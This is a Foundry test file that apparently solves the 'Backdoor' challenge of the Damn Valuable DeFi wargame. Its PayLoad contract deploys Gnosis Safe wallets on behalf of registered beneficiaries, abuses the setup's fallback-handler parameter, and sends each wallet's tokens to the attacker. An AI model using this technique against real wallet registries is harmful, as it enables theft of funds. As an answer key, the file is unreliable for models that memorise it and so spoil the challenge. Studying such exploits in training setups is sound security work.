// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../DamnValuableToken.sol";
import {WalletRegistry} from "../backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";

contract PayLoad {
    GnosisSafe mastercopy;
    DamnValuableToken dvt;
    GnosisSafeProxy walletProxyaddr;
    WalletRegistry walletregistry;
    GnosisSafeProxyFactory factory;
    
    constructor(
                GnosisSafe _mastercopy,
                DamnValuableToken _dvtaddr, 
                WalletRegistry _walletregistryaddr, 
                GnosisSafeProxyFactory _factoryaddr          
            ) {
        mastercopy = _mastercopy;
        dvt = _dvtaddr;
        walletregistry = _walletregistryaddr;
        factory = _factoryaddr;
    }
    function Start(address[] memory _beneficiaries) public {
    for (uint8 i=0; i < _beneficiaries.length; i++) {
        address beneficiary = _beneficiaries[i];
        address[] memory owners = new address[](1);
        owners[0] = beneficiary;
        bytes memory _initializercalldata  = abi.encodeWithSelector(mastercopy.setup.selector, 
                                                                    owners,
                                                                    1,
                                                                    address(0),
                                                                    0x0,
                                                                    address(dvt),
                                                                    address(0),
                                                                    0,
                                                                    address(0)
                                                                );
        walletProxyaddr = factory.createProxyWithCallback(address(mastercopy), _initializercalldata, 0, walletregistry);
        IERC20(address(walletProxyaddr)).transfer(msg.sender, 10e18);
        }
    }
}


contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    PayLoad internal payload;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

    }

    function testExploit() public {
        vm.startPrank(attacker);
        payload = new PayLoad(masterCopy, dvt, walletRegistry, walletFactory);
        payload.Start(users);
        vm.stopPrank();
        verify();
    }

    function verify() internal {
        /** SUCCESS CONDITIONS */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
